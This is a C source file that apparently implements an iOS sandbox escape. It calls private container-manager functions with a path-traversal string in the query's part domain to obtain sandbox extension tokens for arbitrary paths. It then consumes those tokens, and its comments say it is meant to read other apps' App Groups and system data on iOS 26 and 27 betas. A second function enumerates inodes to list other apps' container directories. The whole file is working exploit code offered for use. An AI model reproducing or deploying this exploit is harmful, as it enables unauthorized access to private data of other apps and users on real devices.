//
//  bad_query.c
//  bad_query
//
//  Created by Taj C on 7/21/26.
//

#include "bad_query.h"
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

#include <sys/mount.h>
#include <sys/fsgetpath.h>

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// ---- 函数指针缓存：bad_query 可能被高频调用，每次 dlopen + 10 次 dlsym 开销太大。
// 用 pthread_once 一次性解析并常驻 dylib（不 dlclose，系统库常驻无副作用）。
// Swift 侧已将全部调用串行化，这里再加 once 锁保证初始化线程安全。
static pthread_once_t bq_once = PTHREAD_ONCE_INIT;
static void *bq_mgr = NULL;
static container_query_create_fn q_create;
static container_query_set_class_fn q_set_class;
static container_query_set_identifiers_fn q_set_group_identifiers;
static container_query_set_flags_fn q_set_flags;
static container_query_set_part_fn q_set_part;
static container_query_set_part_domain_fn q_set_part_domain;
static container_query_get_single_result_fn q_get_single_result;
static container_query_free_fn q_free;
static container_copy_sandbox_token_fn q_copy_sandbox_token;
static sandbox_extension_consume_fn q_consume;
static sandbox_extension_release_fn q_release;

static void bq_resolve_once(void) {
    bq_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!bq_mgr) return;
    q_create = (container_query_create_fn)dlsym(bq_mgr, "container_query_create");
    q_set_class = (container_query_set_class_fn)dlsym(bq_mgr, "container_query_set_class");
    q_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(bq_mgr, "container_query_set_group_identifiers");
    q_set_flags = (container_query_set_flags_fn)dlsym(bq_mgr, "container_query_operation_set_flags");
    q_set_part = (container_query_set_part_fn)dlsym(bq_mgr, "container_query_operation_set_part");
    q_set_part_domain = (container_query_set_part_domain_fn)dlsym(bq_mgr, "container_query_operation_set_part_domain");
    q_get_single_result = (container_query_get_single_result_fn)dlsym(bq_mgr, "container_query_get_single_result");
    q_free = (container_query_free_fn)dlsym(bq_mgr, "container_query_free");
    q_copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(bq_mgr, "container_copy_sandbox_token");
    q_consume = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    q_release = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
}

static int bq_symbols_ready(void) {
    return bq_mgr && q_create && q_set_class && q_set_group_identifiers && q_set_flags
        && q_set_part && q_set_part_domain && q_get_single_result && q_free
        && q_copy_sandbox_token && q_consume;
}

int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
    // Sanity check our path and check if something already exists there
    if (!path || path[0] != '/') return -255; // Not an absolute path
    if (!create) {
        struct stat st;
        if (lstat(path, &st) != 0) {
            // 仅当文件确实不存在才提前返回；EPERM/EACCES 是沙盒内无权限看到该路径，
            // 不代表目标不存在——必须继续尝试拿扩展，否则越权读取永远失败。
            if (errno == ENOENT) return -254; // File is missing
        }
    }
    
    pthread_once(&bq_once, bq_resolve_once);
    if (!bq_symbols_ready()) return -1; // Failed to resolve functions
    
    // Create query
    void *query = q_create();
    if (!query) return -2; // Failed to create query
    
    // Set up query
    // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
    xpc_object_t identifier;
    if (group_identifier == NULL) {
        q_set_class(query, 13); // Class 13 (MCMSharedSystemDataContainer) routes to containermanagerd_system
        identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    } else {
        q_set_class(query, 7); // Class 7 (MCMSharedDataContainer) routes to containermanagerd
        identifier = xpc_string_create(group_identifier);
    }
    q_set_group_identifiers(query, identifier);
    q_set_part(query, 3); // Part determines our starting point, part 3 is Library/Caches
    char *part = NULL;
    // Oldest trick in the book. Basic path traversal.
    if (group_identifier == NULL) {
        if (asprintf(&part, "../../../../../../../..%s", path) != -1) {
            q_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            q_free(query);
            return -5; // asprintf failed for some reason
        }
    } else {
        // We have to go one level higher to get to / from an App Group
        if (asprintf(&part, "../../../../../../../../..%s", path) != -1) {
            q_set_part_domain(query, part);
        } else {
            xpc_release(identifier);
            q_free(query);
            return -5; // Same thing
        }
    }
    
    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
    if (is_group) {
        q_set_flags(query, 0x0000000800000000ULL);
    } else {
        q_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Send our query over
    void *result = q_get_single_result(query);
    if (!result) {
        free(part);
        xpc_release(identifier);
        q_free(query);
        return -3; // Outside of sandbox
    }
    char *token = q_copy_sandbox_token(result);
    if (!token) {
        free(part);
        xpc_release(identifier);
        q_free(query);
        return -4; // Kernel refused to issue a sandbox extension
    }
    
    // Consume our fresh sandbox extension and clean up
    // dylib 常驻（函数指针缓存），不 dlclose
    int64_t handle = q_consume(token);
    free(token);
    free(part);
    xpc_release(identifier);
    q_free(query);
    
    return handle;
}

void bad_query_release(int64_t handle) {
    if (handle < 0) return;
    pthread_once(&bq_once, bq_resolve_once);
    if (q_release) q_release(handle);
}

// This still works on 27.0b5
// I'm including it here because it's very useful in the context of this sandbox escape, which can't access parent directories (most of the time)
// This enumerates all directories in a given path, so you can, for example, get all container UUIDs, read their container metadata to get their bundle ID, and derive that entirely on-device without a computer
char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    
    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    const size_t CAP_MAX = 64 * 1024 * 1024; // 防御性绝对上限，防止超巨目录把内存吃爆
    const size_t ENTRY_MAX = 200000;          // 条目数上限（正常 App 数据目录远小于此）
    
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    
    char buf[1200];
    size_t entries = 0;
    for (uint64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        
        size_t need = strlen(p) + 2;
        if (length + need > cap) {
            if (cap >= CAP_MAX || entries >= ENTRY_MAX) break;
            cap *= 2;
            if (cap > CAP_MAX) cap = CAP_MAX;
            char *t = realloc(out, cap);
            if (!t) break;
            out = t;
        }
        if (length + need > cap) break; // 达到绝对上限，截断返回
        length += snprintf(out + length, cap - length, "%s\n", p);
        entries++;
    }
    return out;
}
